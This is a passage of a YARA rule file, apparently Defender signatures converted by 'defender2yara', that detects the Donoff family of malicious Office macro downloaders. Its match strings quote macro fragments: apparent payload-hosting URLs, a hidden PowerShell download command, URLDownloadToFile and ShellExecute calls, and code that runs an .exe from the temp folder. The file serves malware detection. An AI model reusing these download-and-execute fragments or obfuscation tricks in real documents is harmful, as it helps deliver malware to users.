        $x_3_1 = "\"http://www.granmotorpeninsular.com/images/logo.gif\"" ascii //weight: 3
        $x_1_2 = "\"exe.droW_tfosorciM\")," ascii //weight: 1
        $x_1_3 = "DBoMjD(bZUKXFdkBWj" ascii //weight: 1
        $x_1_4 = "xncLCKNJAwPa, bZUKXFdkBWj" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((3 of ($x_1_*))) or
            ((1 of ($x_3_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_2147689064_104
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\"www.gurmetarifler.com/w\" + \"p-content/uploads/yemek-tarifleri/\"" ascii //weight: 1
        $x_1_2 = "\"www.gorge-profonde.x\" + \"xx/w\" + \"p-content/uploads/2015/06/\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_105
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "41"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = "ThisDocument.Bookmarks.Count" ascii //weight: 10
        $x_10_2 = "= UBound(" ascii //weight: 10
        $x_10_3 = "+ Chr$(" ascii //weight: 10
        $x_10_4 = {46 6f 72 6d 2e [0-8] 2e 74 65 78 74 20 3d 20 22}  //weight: 10, accuracy: Low
        $x_1_5 = {53 68 65 6c 6c 20 [0-8] 2c 20 30 [0-4] 45 6e 64 20 49 66}  //weight: 1, accuracy: Low
        $x_1_6 = {53 68 65 6c 6c 20 [0-8] 2c [0-8] 20 30 [0-4] 45 6e 64 20 49 66}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((4 of ($x_10_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_2147689064_106
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "KlzfjiqC(DjT5dz - SMuJ8xF) = R8(DjT5dz)" ascii //weight: 1
        $x_1_2 = "XW04Dy = CreateObject(WgcHX1xVT(VaFB2B, GxoxXD))" ascii //weight: 1
        $x_1_3 = "For VYF3C = 0 To IXO4FLclJx(QS9G70Ad2)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_107
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "mans = Left(\"Scdriftage\", 2) + Lcase(\"riPt\") + \"ing.\"" ascii //weight: 1
        $x_1_2 = "etch = Mid(\"accuseGetunrelieved\", 7, 3) & Left(\"Speciahornet\", 6) & \"lFolder\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_108
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {26 20 66 76 52 41 46 4c 7a 64 20 26 20 64 30 35 32 75 34 20 26 20 47 68 56 6b 64 20 26 20 4e 65 53 6b 54 41 46 62 6a 20 26 20 4a 46 68 50 77 41 71 43 56 20 26 20 43 71 6d 6f 59 20 26 20 57 76 45 34 52 72 20 26 20 4f 58 65 50 30 4c 70 45 0d 0a 65 43 31 67 79 6c 6e 4c 75 20 3d 20 22 41 74 61 4d 5a 22 0d 0a 49 66 20 4d 69 64 28 65 43 31 67 79 6c 6e 4c 75 2c 20 35 29 20 3d 20 22 73 30 78 6e 32 33 22 20 54 68 65 6e}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_109
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = " = Array(Join(Array(" ascii //weight: 1
        $x_1_2 = "(89) = Array(\"" ascii //weight: 1
        $x_1_3 = "(88) = Array(\"" ascii //weight: 1
        $x_1_4 = " \"\"\")(1)" ascii //weight: 1
        $x_1_5 = "\", \"^e" ascii //weight: 1
        $x_1_6 = "\", \"E" ascii //weight: 1
        $x_1_7 = "(86) = Array(\"" ascii //weight: 1
        $x_1_8 = "\", \"^e^\")(1)" ascii //weight: 1
        $x_1_9 = "\", \"CMD\")(1)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (6 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_110
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Array(\"CM" ascii //weight: 1
        $x_1_2 = "= Array(\"D." ascii //weight: 1
        $x_1_3 = "= Array(\"Ex" ascii //weight: 1
        $x_1_4 = "= Array(\"E " ascii //weight: 1
        $x_1_5 = "= Array(\"Po" ascii //weight: 1
        $x_1_6 = "= Array(\"w^" ascii //weight: 1
        $x_1_7 = "= Array(\"E^" ascii //weight: 1
        $x_1_8 = "= Array(\"R^" ascii //weight: 1
        $x_1_9 = "= Array(\"sH" ascii //weight: 1
        $x_1_10 = ".Run " ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (8 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_111
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {22 31 36 36 34 a8 31 38 35 36 a8 31 38 35 36 a8 31 37 39 32 a8 39 32 38 a8 37 35 32 a8 37 35 32 a8 31 38 34 30 a8 31 38 35 36 a8 31 36 31 36 a8 31 36 31 36 a8 31 37 32 38 a8 31 36 33 32 a8 31 38 34 30 a8 37 33 36 a8 31 35 38 34 a8 31 37 37 36 a8 31 37 34 34 a8 37 33 36 a8 31 37 34 34 a8 31 39 32 30 a8 37 35 32 a8 38 39 36 a8 39 31 32 a8 31 39 33 36 a8 31 36 34 38 a8 38 36 34 a8 38 38 30 a8 31 37 36 30 a8 31 37 37 36 22}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_112
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Ix0l2wkl02s4.2eg2xYeH'Vq,4'H%V4TgEVVM4HPJ%HZ\\42pZIuVYtVVtVZyHJxHI826JH.Y2eJxqe2'Z)IH;g H4SJtZagVrVt2-HkPYrZoHVcIeIZ" ascii //weight: 1
        $x_1_2 = "sJs2(VY'Y%gTVYEgVMHqPHV" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_113
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "SatToSve = \"%TMP%\\222.js\"" ascii //weight: 1
        $x_1_2 = "s.WriteText Worksheets(\"Code\").Range(\"B4\").Value" ascii //weight: 1
        $x_1_3 = "WshShell.Run WshShell.ExpandEnvironmentStrings(\"%TMP%\\321.exe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_114
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {43 61 6c 6c 20 [0-64] 28 45 6e 76 69 72 6f 6e 28 22 54 4d 50 22 29 20 26 20 22 5c 22 20 26 20 53 74 72 52 65 76 65 72 73 65 28 22 65 78 65 2e [0-64] 22 29 2c 20 22 68 74 74 70 3a}  //weight: 2, accuracy: Low
        $x_1_2 = {53 68 65 6c 6c 45 78 65 63 75 74 65 57 20 30 26 2c 20 53 74 72 50 74 72 28 22 4f 70 65 6e 22 29 2c 20 53 74 72 50 74 72 28 [0-64] 29 2c 20 53 74 72 50 74 72 28 22 22 29 2c 20 53 74 72 50 74 72 28 22 22 29 2c 20 31}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_115
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "open\", Environ$(\"tmp\")" ascii //weight: 1
        $x_1_2 = "Document_Open" ascii //weight: 1
        $x_1_3 = "ShellExecute" ascii //weight: 1
        $x_1_4 = "URLDownloadToFile" ascii //weight: 1
        $x_1_5 = {46 6f 72 20 [0-64] 20 3d 20 [0-64] 20 54 6f 20 31 20 53 74 65 70 20 2d 31}  //weight: 1, accuracy: Low
        $x_1_6 = {3d 20 4d 69 64 28 [0-64] 2c 20 [0-64] 2c 20 31 29}  //weight: 1, accuracy: Low
        $x_2_7 = "00;quui" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_116
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {69 6e 74 6e 75 6d 20 3d 20 2d 31 20 2a 20 69 6e 74 6e 75 6d 20 2b 20 4c 65 6e 28 43 67 76 64 6e 74 29 0d 0a 76 69 6e 31 20 3d 20 35 20 2b 20 6a 75 73 74 50 72 69 6e 74 32 28 29 0d 0a 49 66 20 31 20 3d 20 76 69 6e 31 20 2b 20 69 6e 74 6e 75 6d 20 54 68 65 6e 20 53 68 65 6c 6c 20 4e 6f 6b 61 74 50 6f 6b 61 2c 20 69 6e 74 6e 75 6d 0d 0a 4e 6f 6b 61 74 50 6f 6b 61 20 3d 20 4e 6f 6b 61 74 50 6f 6b 61 20 2b 20 22 36 46 37 64 45 72 22}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_117
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {73 6f 6c 6f 76 20 3d 20 41 72 72 61 79 28 [0-12] 2c 20 [0-12] 2c 20 [0-12] 2c 20 [0-12] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 4f 70 65 6e 20 22 47 22 20 2b 20 55 43 61 73 65 28 [0-16] 29 20 2b 20 22 54 22 2c 20 52 65 64 69 73 74 72 69 62 75 74 65 28 73 6f 6c 6f 76 2c 20 [0-6] 29 2c 20 46 61 6c 73 65 [0-5] 6a 73 6f 6e 50 61 72 73 65 53 74 72 69 6e 67 2e 53 65 6e 64}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_118
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Sub autoopen()" ascii //weight: 1
        $x_1_2 = " = ActiveDocument.CustomDocumentProperties(" ascii //weight: 1
        $x_1_3 = " + \"\" + ActiveDocument.BuiltInDocumentProperties(\"Comments\") +" ascii //weight: 1
        $x_1_4 = " + \"\").Run$ \"\" + " ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_119
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Chr(CInt(UGLIK(strFileName)) / (9 + 7))" ascii //weight: 1
        $x_1_2 = "\"1664009876543210018560098765432100185600987654321001792009876543210092800987654321007520098765432100752" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_120
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = "bypass -noprofile -windowstyle hidden -command (New-Object" ascii //weight: 2
        $x_1_2 = {27 25 54 45 4d 50 25 5c ?? ?? ?? ?? ?? ?? ?? 2e 65 78 65 27 29 3b 53 74 61 [0-1] 72 74 20 28 25 54 45 4d 50 25 5c 00 2e 65 78 65 29 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = "Po^werS^h^ell -Ex^e^cutio^nPol^icy" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_121
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Replace(\"mZoxY938kdWsZoxY938kdWsZoxY938kdWcZoxY938kdWrZoxY938kdWiZoxY938kdWpZoxY938kdWtZoxY938kdWcZoxY938kdWoZoxY938kdWnZoxY938kdWtZoxY938kdWrZoxY938k" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_122
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\"sbk/psdbn0462/443/53/69200;quui\"" ascii //weight: 1
        $x_1_2 = "\"sbk/mpsuopd\"" ascii //weight: 1
        $x_1_3 = "Lib \"shell32.dll\" Alias \"ShellExecuteA\" (ByVal" ascii //weight: 1
        $x_1_4 = "Lib \"urlmon\" Alias \"URLDownloadToFileA\" (ByVal" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_123
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {20 4a 6f 69 6e 28 10 00 2c 20 22 22 29 ff 03 0d 0a 00 20 3d 20 41 72 72 61 79 28 01 00 08 00 2c 20 01 00 08 00 2c 20 01 00 08 00 2c 20 01 00 08 00 2c 20 [0-255] [0-255] [0-255] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {53 75 62 20 44 6f 63 75 6d 65 6e 74 5f 4f 70 65 6e 28 29 0d 0a 01 00 10 00 [0-80] 20 3d 20 41 72 72 61 79 28 22 ?? [0-8] 22 2c 20 22 ?? [0-8] 22 2c 20}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_124
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 49 6e 53 74 72 28 [0-32] 2c 20 [0-32] 29 20 3c 3e 20 30 0d 0a}  //weight: 1, accuracy: Low
        $x_1_2 = "\", CreateObject(" ascii //weight: 1
        $x_1_3 = {0d 0a 43 61 6c 6c 42 79 4e 61 6d 65 20}  //weight: 1, accuracy: High
        $x_1_4 = " = CallByName(" ascii //weight: 1
        $x_1_5 = {50 72 69 76 61 74 65 20 53 75 62 20 44 6f 63 75 6d 65 6e 74 5f 4f 70 65 6e 28 29 0d 0a 44 69 6d 20 [0-16] 20 41 73 20 42 6f 6f 6c 65 61 6e 0d 0a [0-32] 2e [0-16] 0d 0a 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_125
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 75 62 20 [0-16] 28 29 [0-4] 44 69 6d 20 [0-16] 20 41 73 20 53 74 72 69 6e 67 [0-4] 44 69 6d 20 [0-16] 20 41 73 20 56 61 72 69 61 6e 74 [0-4] [0-16] 20 3d 20 [0-32] 2e [0-32] 2e 43 6f 6e 74 72 6f 6c 54 69 70 54 65 78 74 [0-4] [0-32] 20 3d 20 [0-32] 2e [0-32] 28 [0-16] 29}  //weight: 1, accuracy: Low
        $x_1_2 = "= ThisDocument.Path" ascii //weight: 1
        $x_1_3 = "& \"/\" & ThisDocument.Name" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_126
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Mid(phenotype, i, 1)" ascii //weight: 1
        $x_1_2 = "= ((CByte(anomiidae)))" ascii //weight: 1
        $x_1_3 = "= mechanically(crunch) + 2" ascii //weight: 1
        $x_1_4 = "= mechanically(crunch) Xor bouleverser" ascii //weight: 1
        $x_1_5 = "= inaudibly.compressibility.Caption" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_127
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "RlrWffobM = Environ(\"U\" + \"SERP\" + \"RO\" + \"F\" + \"IL\" + \"E\")" ascii //weight: 1
        $x_1_2 = "VkCzjTVqmGakjaJ.Run (QkFMUISjPpAxxpy)" ascii //weight: 1
        $x_1_3 = "BBEuzrQzs = \"cMxLzFb\"" ascii //weight: 1
        $x_1_4 = "hFvGWm = \".\"" ascii //weight: 1
        $x_1_5 = "MzrKWi = \"exe\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_128
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "KWRLJD = KWRLJD + LIi(Val(LIi((-2073 + 2111)) & LIi((-6352 + 6424)) & (Mid$(MY, (2 * Ki) - 1, 2))) Xor Vzrm33(Mid$(JQZg4P, (Ki - (EQff * (Ki \\ EQff)) + 1), 1)))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_129
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "\"NmisY\" + \"U\" + \"C\"" ascii //weight: 2
        $x_1_2 = "\"word\" + \".Applicat\" + \"io\" + \"n\"" ascii //weight: 1
        $x_1_3 = "\"ScriptCo\" + \"n\" + \"t\" + \"r\" + \"o\" + \"l\"" ascii //weight: 1
        $x_2_4 = "\"FUCK AV\"" ascii //weight: 2
        $x_1_5 = "\"US\" + \"ERPRO\" + \"FIL\" + \"E\"" ascii //weight: 1
        $x_1_6 = "= \"NmisYUC\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((4 of ($x_1_*))) or
            ((1 of ($x_2_*) and 2 of ($x_1_*))) or
            ((2 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_2147689064_130
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {45 6e 76 69 72 6f 6e 6d 65 6e 74 53 74 72 69 6e 67 73 [0-5] 22 2c 20 32 ?? 29 60 00 2e 65 78 65 22}  //weight: 1, accuracy: Low
        $x_1_2 = {76 62 61 2e 63 72 65 61 74 65 6f 62 6a 65 63 74 28 ?? ?? ?? ?? [0-2] 28 22 77 73 63 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? [0-48] 20 3d 20 02 00 01 00 20 (2b|2d) 20 02 00 01 00}  //weight: 1, accuracy: Low
        $x_1_3 = {2c 20 31 2c 20 22 25 74 65 6d 70 25 22 29 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? [0-10] 20 3d 20 02 00 01 00 20 (2b|2d) 20 02 00 01 00}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_131
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 49 6e 53 74 72 28 [0-32] 2c 20 [0-32] 29 20 3c 3e 20 30 0d 0a}  //weight: 1, accuracy: Low
        $x_1_2 = "(CreateObject(" ascii //weight: 1
        $x_1_3 = {0d 0a 43 61 6c 6c 42 79 4e 61 6d 65 20}  //weight: 1, accuracy: High
        $x_1_4 = " = CallByName(" ascii //weight: 1
        $x_1_5 = {50 72 69 76 61 74 65 20 53 75 62 20 44 6f 63 75 6d 65 6e 74 5f 4f 70 65 6e 28 29 0d 0a 44 69 6d 20 [0-16] 20 41 73 20 42 6f 6f 6c 65 61 6e 0d 0a 44 69 6d 20 [0-16] 20 41 73 20 [0-16] 0d 0a [0-32] 2e [0-16] 0d 0a 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_132
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
